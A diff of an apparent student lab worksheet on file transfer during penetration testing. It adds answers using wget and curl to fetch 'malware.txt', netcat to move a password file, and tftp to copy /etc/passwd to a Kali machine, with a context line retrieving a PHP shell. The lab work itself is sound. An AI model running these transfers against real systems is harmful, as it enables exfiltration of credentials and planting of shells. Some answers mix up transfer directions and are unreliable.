@@ -198,16 +198,15 @@ tftp 10.12.181.X <<< "get shell5555.php shell5555.php"
     ````
     python3 -m http.server 5000
     ````
-1. On your Student machine, download the malware.txt file with the wget command.
-    > Your command :
+2. On your Student machine, download the malware.txt file with the wget command.
+    > Your command : ***wget http://localhost:5000/malware.txt***
 
-1. On your Student machine, download the malware.txt file with the cURL command.
-    > Your command :
+3. On your Student machine, download the malware.txt file with the cURL command.
+    > Your command : ***curl -O http://localhost:5000/malware.txt***
 
-1. On the student machine, create a file named password.txt and transfer it to your student machine with netcat
-    > Your commands
+4. On the student machine, create a file named password.txt and transfer it to your student machine with netcat
+    > Your commands : ***touch password.txt*** ; ***nc -lvp 5000 < password.txt*** (sending machine)
+    ***nc 10.12.1.22 5000 > received_password.txt*** (my machine)
 
-1. On the student machine,  transfer ``/etc/passwd`` file to your kali machine with tftp
-    > your commands
-
-
+5. On the student machine,  transfer ``/etc/passwd`` file to your kali machine with tftp
+    > Your commands : ***tftp 10.12.1.22*** ; ***tftp> get /etc/passwd***
